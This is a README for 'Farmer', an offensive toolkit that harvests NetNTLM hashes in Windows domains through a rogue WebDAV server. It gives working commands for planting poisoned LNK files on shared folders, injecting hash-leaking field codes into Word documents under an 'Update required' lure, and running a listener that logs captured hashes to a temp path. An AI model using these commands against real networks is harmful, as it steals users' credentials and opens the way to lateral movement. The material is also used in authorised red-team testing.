# Farmer

Author: @domchell

## Overview

*I wanted to be a farmer, so I started harvesting hashes*

Farmer is a project for collecting NetNTLM hashes in a Windows domain. Farmer achieves this by creating a local WebDAV server that causes the WebDAV Mini Redirector to authenticate from any connecting clients.

In order for Farmer to be successful, the clients MUST be able to connect to the local WebDAV server. Possible things that could prohibit this include network segmentation and/or the Windows firewall. Be sure to check these out first (*hint* Seatbelt WindowsFirewall).

## Spreading the crop

Farmer includes a submodule for the Crop tool, this tool can be used to create LNK files that initiate a WebDAV connection when browsing to a folder where the LNK is stored as it will try and render the stored icon.

The concept of the attack is, you should use Crop to poison the desired file shares with the LNK file pointing to the Farmer WebDAV server.

For example:

```
crop.exe \\fileserver\Common crop.lnk \\workstation@8888\harvest \\workstation@8888\harvest
```

When any user browses to \\fileserver\Common, explorer will attempt to recover the icon from the Farmer WebDAV server and in doing so submit the user's NetNTLM hash.

## Fertilising the crop

Farmer includes another submodule for the Fertiliser tool, this tool can be used to poison Office documents (currently just docx) with a malicious field code. This causes the field code to be parsed when the document is opened and will leak the hash to the WebDAV server of your choice :)

For example:
```
Fertiliser.exe \\fileserver\important.docx http://workstation:8888/foo "Update required"
```

## Farming

Farmer will listen on a user defined port, for a number of seconds and write the output to the filesystem if required:

Usage:
```
farmer.exe <port> [seconds] [output]
```

If no seconds are specified, or its set to 0, farmer will run indefinitely, for example:

```
farmer.exe 8888 0 c:\windows\temp\test.tmp
```

To run farmer for one minute on port 8888, do the following:

```
farmer.exe 8888 60
```

If you're wanting to write the Farmer log to the filesystem, you can AES encrypt the log file using the key set in Config.key and setting the encrypt bool to true (default false).

The log file can be decrypted with the HarvestCrop tool, for example:
```
harvestcrop.exe c:\windows\temp\test.tmp farmer
```
